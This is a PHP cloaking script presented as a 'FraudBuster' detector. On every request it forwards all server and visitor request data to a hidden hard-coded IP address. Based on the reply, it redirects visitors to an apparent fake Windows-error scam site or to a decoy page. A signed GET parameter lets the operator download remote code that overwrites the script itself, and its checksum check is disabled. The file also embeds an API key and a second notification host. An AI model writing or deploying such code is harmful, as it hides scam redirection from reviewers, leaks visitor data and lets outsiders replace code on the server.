<?php
class FraudBusterDetector_9nd9pv7r28 {
    public function check() {
        ob_start();
        $this->printDefaultRedirectHeaders();

        if (isset($_GET['fb17x_sign']) && isset($_GET['fb17x_time'])) {
            if ($this->isSignatureValid($_GET['fb17x_sign'], $_GET['fb17x_time'])) {
                $this->runInMaintenanceMode();
                die();
            }
        }

        $runEngine = true;

        if ($runEngine) {
            $resultObj = $this->sendRequestAndGetResult2(false);
        }
        ob_end_clean();

        if ($runEngine) {
            if ($resultObj->result) {
                $this->moneyAction($resultObj);
            } else {
                $this->safeAction($resultObj);
            }
        }
    }

    function url_origin($s)
    {
        $ssl      = ( ! empty( $s['HTTPS'] ) && $s['HTTPS'] == 'on' );
        $sp       = strtolower( $s['SERVER_PROTOCOL'] );
        $protocol = substr( $sp, 0, strpos( $sp, '/' ) ) . ( ( $ssl ) ? 's' : '' );
        $port     = $s['SERVER_PORT'];
        $port     = ( ( ! $ssl && $port=='80' ) || ( $ssl && $port=='443' ) ) ? '' : ':'.$port;
        $host     = $s['HTTP_HOST'];
        $host     = isset( $host ) ? $host : $s['SERVER_NAME'] . $port;
        return $protocol . '://' . $host;
    }

    function full_url($s)
    {
        return $this->url_origin($s) . $s['REQUEST_URI'];
    }

    function isSignatureValid($sign, $time) {
        $str = $this->getApikey().'.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }

    function runInMaintenanceMode() {
        global $fbIncludedFileName;
        global $fbIncludedHomeDir;

        $mode = $_GET['fb17x_mode'];
        if (!isset($mode)) {
            return $this->returnError('Maintenance mode not set');
        }

        $clid = $this->getClid();

        if ($fbIncludedFileName && $fbIncludedHomeDir) {
            $home = $fbIncludedHomeDir;
            $fileName = $fbIncludedFileName;
        } else {
            $fileName = __FILE__;
            $home = realpath(dirname(__FILE__));
        }

        if ($mode === 'upgrade') {
            $this->upgradeScript($home, $fileName);
        } else if ($mode === 'diagnostics') {
            $this->performDiagnostics($home, $fileName);
        } else {
            return $this->returnError('Undefined maintenance mode: '.$mode);
        }
    }

    function redirect($url) {
        header('Location: '.$url, true, 302);
        die();
    }


    function printDefaultRedirectHeaders() {
        header("Cache-Control: no-cache, private, must-revalidate");
        header("Pragma: no-cache");
        header("Expires: 0");
    }

    function returnError($message) {
         echo('{"success":false, "errorMessage":"'.$message.'"}');
    }

    function getClid() {
        return '9nd9pv7r28';
    }

    function getApikey() {
        return '1b4895a7e31fa11168d976adbbce17f39';
    }

    function appendGetParameters($url, $getParameters) {
        if ($getParameters) {
            if (strpos($url, '?') !== false) {
                return $url.'&'.$getParameters;
            } else {
                return $url.'?'.$getParameters;
            }
        }
        return $url;
    }

    function isWpHomePage() {
        if (!function_exists('wp_upload_dir')) {
            return false;
        }
        $uri = $_SERVER['REQUEST_URI'];
        if (!$uri || strlen($uri) < 2) {
            return true;
        }

        if (strlen($uri) >= 10 && substr( $uri, 0, 10 ) === "/category/") {
            return true;
        }

        return (substr( $uri, 0, 2 ) === "/?") || (substr( $uri, 0, 2 ) === "/#");
    }

    function moneyAction($resultObj) {
        $getParams = (isset($resultObj->getParams)) ? $resultObj->getParams : '';
        $url = "http://fixerrorwindows.online/schinlitis/index.html";
        
        if (isset($getParams) && $getParams) {
            $url = $this->appendGetParameters($url, $getParams);
        }
        $this->redirect($url);
    }
    function safeAction($resultObj) {
        $getParams = (isset($resultObj->getParams)) ? $resultObj->getParams : '';
        $url = "http://quetta.online/index.php/home/about_us_videos";
        
        if (isset($getParams) && $getParams) {
            $url = $this->appendGetParameters($url, $getParams);
        }
        $this->redirect($url);
    }
    function getErrorMessageForCurl($code) {
        if ($code === 2) {
            return "Unable to init curl (code 2)";
        } else if ($code === 6) {
            return "It seems your server's DNS resolver is not able to resolver our domain. Please contact your hosting provider and tell them about this issue.\nIf they do not help you then please try our recommended hosting providers: http://listen.fraudbuster.im/w/kCgvS698rqtt9dusj892bBgA";
        } else if ($code === 7) {
            return "Unable to connect to the server (code 7)";
        } else if ($code === 28) {
            return "Operation timeout. Check you DNS setting (curl code 28)";
        } else {
            return "Curl error ".$code;
        }
    }
    function performDiagnostics($home, $fileName) {
        header("X-FB2: true");
        $errors = array();
        $success = true;
        $permissionsIssues = $this->hasPermissionsIssues($home, $fileName);
        if ($permissionsIssues) {
            $errors[] = $permissionsIssues;
            $success = false;
        }
        $time_start = microtime(true);
        $serverConnectionIssues = $this->getConnectionIssues();
        $time_finish = microtime(true);
        $duration = $time_finish - $time_start;
        $errors[] = 'Request to server duration: '.$duration;
        if (isset($serverConnectionIssues->error) && $serverConnectionIssues->error) {
            $errors[] = $serverConnectionIssues->error;
            $success = false;
        }
        $result = array('success' => $success, 'errors' => $errors, 'version' => 4);
        echo(json_encode($result));
    }
    function getConnectionIssues() {
        return $this->sendRequestAndGetResult2(true);
    }
    function upgradeScript($home, $fileName) {
        $ch = curl_init("http://dashboard.fraudbuster.im/api/v1/fb2/php/get-updates?clid=".$this->getClid().'&integrationType=DEFAULT');

        $data_to_post = array();
        $headers = array();

        $headers[] = 'x-apikey: '.$this->getApiKey();

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $output = curl_exec($ch);

        if (!$output || strlen($output) == 0) {
            curl_close($ch);
            return $this->returnError('Server returned empty answer');
        }

        $sha = sha1($output);

        $checkSum = $_GET["fb17x_checksum"];
//        if ($sha !== $checkSum) {
//            return $this->returnError('Checksums are different.');
//        }

        if (strlen($output) == 0) {
            $curl_error_number = curl_errno($ch);
            $answer = $this->returnError('You have made some mistake or your server is misconfigured. This is not the fault of our service. Empty answer from server. '.$this->getErrorMessageForCurl($curl_error_number));
            curl_close($ch);
            return $answer;
        }

        curl_close($ch);

        $tempFileName = $fileName.'.downloaded';
        $file = fopen($tempFileName, 'w');
        $saved = fwrite($file, $output);
        fclose($file);

        $expectedToSave = strlen($output);
        if (!$saved || $saved < $expectedToSave) {
            return $this->returnError('You have made some mistake or your server is misconfigured. This is not the fault of our service. Unable to save data to downloaded file'.$tempFileName.', saved only ' . $saved .' ' . bytes. '. Expected ' . $expectedToSave);
        }
        if(!rename ($tempFileName, $fileName)) {
            return $this->returnError('You have made some mistake or your server is misconfigured. This is not the fault of our service. Unable to rename file'.$tempFileName.' to '.$fileName);
        }
        echo('{"success":true, "errorMessage":""}');
    }
    function hasPermissionsIssues($home, $fileName) {
        ob_start();
        $tempFileName = $fileName.'.tempfile';
        $tempFile = fopen($tempFileName, 'w');
        if ( !$tempFile ) {
            ob_end_clean();
            return 'You have made some mistake or your server is misconfigured. This is not the fault of our service. Unable to write a file '.$tempFileName.'. Please issue 777 permission to the folder : '.$home;
        } else {
            ob_end_clean();
            $meta_data = stream_get_meta_data($tempFile);
            $fullfilename = $meta_data["uri"];
             fclose($tempFile);
             return unlink($tempFileName) ? "" : 'You have made some mistake or your server is misconfigured. This is not the fault of our service. Unable to delete written file. Please fix write permissions';
        }
    }
    function concatQueryVars($originalUrl) {
        $second = $_SERVER['REQUEST_URI'];
        $url = strtok($originalUrl, '?');                                                                
        $first = parse_url($originalUrl, PHP_URL_QUERY);                                                 
        $second = parse_url($second, PHP_URL_QUERY);                                                     
        if (!$second) {
            return $originalUrl;                                                                         
        }                                                                                                
        if (!$first) {                                                                                   
            return $url . '?' . $second;
        }
        return $url . '?' . $first. '&' . $second;
    }

    function sendRequestAndGetResult2($testConnection) {
        if ($testConnection) {
            if (!function_exists('curl_init')) {
                $resultObj->error = "You have made some mistake or your server is misconfigured. This is not the fault of our service. php-curl is disabled on your host. Please ask your host to enable php-curl. Technical details: undefined function curl_init";
                return $resultObj;
            }
        }

        $resultObj = (object) array('result' => false);

        // Please do not reveal this domain to anyone!
        $url = "http://107.178.254.160/fb2?clid=9nd9pv7r28&apikey=1b4895a7e31fa11168d976adbbce17f39&hash=-1382659310";
        $nParam = '37689e86n';
        if (isset($_GET[$nParam])) {
            $url = $url . '&'.$nParam.'='.$_GET[$nParam];
        }
        if ($testConnection) {
            $url = $url."&fb17x-diagnostics=true";
        }
        $ch = curl_init($url);

        $data_to_post = array();
        $headers = array();

        foreach ( $_SERVER as $key=>$normalizedValue ) {
            if (is_array($normalizedValue)) {
                $normalizedValue = implode(',', $normalizedValue);
            }
            $normalizedValue = trim(preg_replace('/\s+/', ' ', $normalizedValue));
            $smallHeader = strlen($normalizedValue) < 1000;
            if ($smallHeader || $key == 'HTTP_USER_AGENT' || $key == 'HTTP_REFERER' || $key == 'QUERY_STRING' || $key == 'REQUEST_URI') {
                $headers[] = 'X-HP_'.$key.': '.$normalizedValue;
            } else {
                $headers[] = 'X-HP_removed_'.$key.': skipped because had size '.strlen($normalizedValue);
            }
        }

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        $output = curl_exec($ch);
        $curl_error_number = curl_errno($ch);

        $json = json_decode($output);
        if ($json == null) {
            $result  = false;
            if ($testConnection) {
                if ($curl_error_number == 6) {
                    $resultObj->error = $resultObj->error = "You have made some mistake or your server is misconfigured. This is not the fault of our service. Your host is not able to resolve our API domain. It is using faulty DNS resolvers. Please find more info here: https://fraudbuster.zendesk.com/hc/en-us/articles/211511303";
                } else {
                    $resultObj->error = $resultObj->error = "You have made some mistake or your server is misconfigured. This is not the fault of our service. php-curl is disabled on your host. Please ask your host to enable php-curl. Error code: ".$curl_error_number.', output: '.$output;
                }
                return $resultObj;
            } else {
                $this->notifyAboutError("EMPTY_ANSWER_curl_error_number_".$curl_error_number.'_output'.$output);
            }
        } else {
            $hasResult = isset($json->result);
            if (!$hasResult) {
                $this->notifyAboutError("no_result_field_in_json_output:".$output);
            }
            $result = $hasResult ? (int) $json->result : 0;

            $resultObj->result = $result;
            if (isset($json->getParams)) {
                $resultObj->getParams = $json->getParams;
            }
            if (isset($json->timestamp)) {
                $resultObj->timestamp = $json->timestamp;
            }
            if ($testConnection) {
                if (strpos($output, 'exception')) {
                    curl_close($ch);
                    $resultObj->error = "Php client received error from the server: ".$json->message;
                    return $resultObj;
                } else if (strpos($output, 'result') === false) {
                    curl_close($ch);
                    $resultObj->error = "Php client receives unexpected answer from FraudBuster server:".$output;
                    return $resultObj;
                }
                if (isset($_GET['fb17x_ip'])) {
                    $expectedIp = $_GET['fb17x_ip'];
                    if ($expectedIp) {
                        if ($expectedIp != $json->ip) {
                            curl_close($ch);
                            $resultObj->error = "You have made some mistake or your server is misconfigured. This is not the fault of our service. Your server is sending us private IP address and not the real visitor IP address, we suggest using server pilot setup: https://fraudbuster.zendesk.com/hc/en-us/articles/209106486-Hosting-Setup, people using this setup never run into this such issues.";
                            return $resultObj;
                        }
                    }
                }
                if ($result === 0 || $result === 1) {
                    curl_close($ch);
                    $resultObj->result = true;
                    return $resultObj;
                }
                curl_close($ch);
                $resultObj->error = "Php client receives unexpected answer from FraudBuster server:".$result;
                return $resultObj;
            }
        }

        curl_close($ch);
        return $resultObj;
    }

    function notifyAboutError($message) {
        $len = strlen($message);
        if ($len > 800) {
            $message = substr($message, 0, 800);
        }
        $message = urlencode($message);

        $url = 'http://192.81.209.149/fb-notify.html?v=2&cf=false&guid=9nd9pv7r28&m='.$message;
        $ch = curl_init($url);

        curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);

        $output = curl_exec($ch);
    }
}

$fraudBusterDetector_9nd9pv7r28 = new FraudBusterDetector_9nd9pv7r28();
$fraudBusterDetector_9nd9pv7r28->check();

?>